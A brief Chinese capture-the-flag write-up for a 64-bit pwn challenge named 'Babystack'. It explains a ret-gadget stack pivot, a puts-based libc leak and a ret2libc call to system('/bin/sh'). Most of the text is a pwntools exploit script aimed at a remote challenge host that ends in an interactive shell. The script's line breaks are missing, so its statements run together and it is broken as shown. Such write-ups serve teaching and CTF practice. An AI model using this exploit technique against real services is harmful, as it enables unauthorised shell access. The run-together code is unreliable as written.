Babystack


检查文件保护，64位elf程序，只开启NX保护.

 

 

这题猛的一看，没找到洞，考点是爆破栈迁移，我们在返回地址上面填充ret的gadget，多尝试几次即可.

思路，

通过ROP去调用puts_plt(puts_got)去leak出libcbase

继续rop 通过ROP去调用system("/bin/sh\x00")拿shell.

Exp

from pwn import *context.log_level = 'debug'context.arch = 'amd64'#p=process("./babystack")p=remote("81.69.230.99",9002)elf=ELF("./babystack")libc=ELF("/home/ymt/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc.so.6")pop_rdi_ret = 0x0000000000400813pd =  "aaaaa"pd += p64(0x0000000000400702)*0x9pd += p64(pop_rdi_ret)pd += p64(elf.got['puts'])pd += p64(elf.plt['puts'])pd += p64(0x400590)p.send(pd)libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8,b"\x00")) - libc.sym['puts']system = libc_base + libc.symbols['system']binsh = libc_base + next(libc.search("/bin/sh"))print "libc_base : "+hex(libc_base)print "system : "+hex(system)print "binsh : "+hex(binsh)pd =  "aaaaa"pd += p64(0x0000000000400702)*0x9pd += p64(pop_rdi_ret)pd += p64(binsh)pd += p64(system)pd += p64(0x400590)p.send(pd)p.interactive()
